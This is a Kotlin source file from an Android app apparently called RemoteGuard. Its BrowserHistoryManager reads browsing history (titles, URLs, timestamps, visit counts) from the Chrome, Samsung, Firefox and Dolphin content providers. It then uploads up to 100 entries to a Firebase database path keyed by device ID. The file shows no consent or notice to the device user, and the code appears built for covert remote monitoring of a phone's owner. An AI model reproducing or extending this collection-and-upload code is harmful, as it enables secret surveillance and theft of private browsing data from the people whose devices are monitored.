package com.remoteguard.app

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

object BrowserHistoryManager {
    private const val CHROME_HISTORY_URI = "content://com.android.chrome/bookmarks"
    private const val CHROME_HISTORY_URI_ALT = "content://com.google.android.apps.chrome/bookmarks"
    private const val SAMSUNG_BROWSER_URI = "content://com.sec.android.app.sbrowser.browser/bookmarks"
    private const val FIREFOX_HISTORY = "content://org.mozilla.firefox.db/history/visits"
    private const val DOLPHIN_BROWSER = "content://com.dolphin.browser.history/history"

    data class BrowserEntry(
        val title: String,
        val url: String,
        val timestamp: Long,
        val visits: Int = 1
    )

    fun getBrowserHistory(context: Context) {
        try {
            Log.d("BrowserHistoryManager", "Fetching browser history...")
            val historyList = mutableListOf<BrowserEntry>()

            // Try Chrome
            historyList.addAll(fetchChromeHistory(context))

            // Try Samsung Browser
            if (historyList.isEmpty()) {
                historyList.addAll(fetchSamsungBrowserHistory(context))
            }

            // Try Firefox
            if (historyList.isEmpty()) {
                historyList.addAll(fetchFirefoxHistory(context))
            }

            // Try Dolphin
            if (historyList.isEmpty()) {
                historyList.addAll(fetchDolphinBrowserHistory(context))
            }

            Log.d("BrowserHistoryManager", "Found ${historyList.size} entries")
            saveBrowserHistoryToFirebase(context, historyList)
        } catch (e: Exception) {
            Log.e("BrowserHistoryManager", "Error fetching browser history: ${e.message}", e)
            FirebaseHelper.logRemote("BrowserHistoryManager", "Error: ${e.message}", true)
        }
    }

    private fun fetchChromeHistory(context: Context): List<BrowserEntry> {
        val entries = mutableListOf<BrowserEntry>()
        try {
            val uris = listOf(
                Uri.parse(CHROME_HISTORY_URI),
                Uri.parse(CHROME_HISTORY_URI_ALT)
            )

            for (uri in uris) {
                try {
                    val cursor = context.contentResolver.query(
                        uri,
                        arrayOf("title", "url", "date_added", "visits"),
                        null,
                        null,
                        "date_added DESC LIMIT 100"
                    ) ?: continue

                    cursor.use {
                        while (it.moveToNext()) {
                            try {
                                val title = it.getString(it.getColumnIndex("title")) ?: ""
                                val url = it.getString(it.getColumnIndex("url")) ?: ""
                                val timestamp = it.getLong(it.getColumnIndex("date_added"))
                                val visits = it.getInt(it.getColumnIndex("visits"))

                                if (url.isNotEmpty() && (url.startsWith("http://") || url.startsWith("https://"))) {
                                    entries.add(BrowserEntry(title, url, timestamp, visits))
                                }
                            } catch (e: Exception) {
                                Log.w("BrowserHistoryManager", "Error parsing Chrome history entry: ${e.message}")
                            }
                        }
                    }
                    if (entries.isNotEmpty()) break
                } catch (e: Exception) {
                    Log.w("BrowserHistoryManager", "Chrome history access failed: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e("BrowserHistoryManager", "Chrome history fetch error: ${e.message}")
        }
        return entries.sortedByDescending { it.timestamp }
    }

    private fun fetchSamsungBrowserHistory(context: Context): List<BrowserEntry> {
        val entries = mutableListOf<BrowserEntry>()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse(SAMSUNG_BROWSER_URI),
                arrayOf("title", "url", "date_added", "visits"),
                null,
                null,
                "date_added DESC LIMIT 100"
            ) ?: return entries

            cursor.use {
                while (it.moveToNext()) {
                    try {
                        val title = it.getString(it.getColumnIndex("title")) ?: ""
                        val url = it.getString(it.getColumnIndex("url")) ?: ""
                        val timestamp = it.getLong(it.getColumnIndex("date_added"))
                        val visits = it.getInt(it.getColumnIndex("visits"))

                        if (url.isNotEmpty() && (url.startsWith("http://") || url.startsWith("https://"))) {
                            entries.add(BrowserEntry(title, url, timestamp, visits))
                        }
                    } catch (e: Exception) {
                        Log.w("BrowserHistoryManager", "Error parsing Samsung history entry: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("BrowserHistoryManager", "Samsung browser history access failed: ${e.message}")
        }
        return entries.sortedByDescending { it.timestamp }
    }

    private fun fetchFirefoxHistory(context: Context): List<BrowserEntry> {
        val entries = mutableListOf<BrowserEntry>()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse(FIREFOX_HISTORY),
                arrayOf("title", "url", "date_visited"),
                null,
                null,
                "date_visited DESC LIMIT 100"
            ) ?: return entries

            cursor.use {
                while (it.moveToNext()) {
                    try {
                        val title = it.getString(it.getColumnIndex("title")) ?: ""
                        val url = it.getString(it.getColumnIndex("url")) ?: ""
                        val timestamp = it.getLong(it.getColumnIndex("date_visited"))

                        if (url.isNotEmpty() && (url.startsWith("http://") || url.startsWith("https://"))) {
                            entries.add(BrowserEntry(title, url, timestamp, 1))
                        }
                    } catch (e: Exception) {
                        Log.w("BrowserHistoryManager", "Error parsing Firefox history entry: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("BrowserHistoryManager", "Firefox history access failed: ${e.message}")
        }
        return entries.sortedByDescending { it.timestamp }
    }

    private fun fetchDolphinBrowserHistory(context: Context): List<BrowserEntry> {
        val entries = mutableListOf<BrowserEntry>()
        try {
            val cursor = context.contentResolver.query(
                Uri.parse(DOLPHIN_BROWSER),
                arrayOf("title", "url", "date"),
                null,
                null,
                "date DESC LIMIT 100"
            ) ?: return entries

            cursor.use {
                while (it.moveToNext()) {
                    try {
                        val title = it.getString(it.getColumnIndex("title")) ?: ""
                        val url = it.getString(it.getColumnIndex("url")) ?: ""
                        val timestamp = it.getLong(it.getColumnIndex("date"))

                        if (url.isNotEmpty() && (url.startsWith("http://") || url.startsWith("https://"))) {
                            entries.add(BrowserEntry(title, url, timestamp, 1))
                        }
                    } catch (e: Exception) {
                        Log.w("BrowserHistoryManager", "Error parsing Dolphin history entry: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.w("BrowserHistoryManager", "Dolphin browser history access failed: ${e.message}")
        }
        return entries.sortedByDescending { it.timestamp }
    }

    private fun saveBrowserHistoryToFirebase(context: Context, entries: List<BrowserEntry>) {
        try {
            val id = FirebaseHelper.getDeviceId(context)
            val database = FirebaseDatabase.getInstance()
            val historyList = entries.take(100).map { entry ->
                mapOf(
                    "title" to entry.title,
                    "url" to entry.url,
                    "timestamp" to entry.timestamp,
                    "visits" to entry.visits
                )
            }

            database.getReference("devices/$id/browserHistory").setValue(historyList)
                .addOnSuccessListener {
                    Log.d("BrowserHistoryManager", "Browser history saved to Firebase: ${entries.size} entries")
                }
                .addOnFailureListener { e ->
                    Log.e("BrowserHistoryManager", "Failed to save history: ${e.message}", e)
                }
        } catch (e: Exception) {
            Log.e("BrowserHistoryManager", "Error saving browser history: ${e.message}", e)
        }
    }
}
